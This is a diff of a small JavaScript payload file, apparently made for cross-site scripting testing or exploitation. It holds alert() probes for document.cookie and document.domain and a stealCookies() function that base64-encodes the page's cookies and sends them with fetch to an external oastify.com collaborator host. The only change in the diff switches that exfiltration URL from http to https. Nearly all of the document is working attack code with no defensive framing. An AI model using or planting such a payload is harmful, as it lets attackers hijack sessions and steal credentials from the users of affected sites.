@@ -1,7 +1,7 @@
 alert(document.cookie);
 alert(document.domain);
 function stealCookies(){
-  const url = 'http://bcrsweta3cja1n7ra673qlbvlmrdf93y.oastify.com/?cookies=' + btoa(document.cookie)
+  const url = 'https://bcrsweta3cja1n7ra673qlbvlmrdf93y.oastify.com/?cookies=' + btoa(document.cookie)
   const response = fetch(url)
 }
 
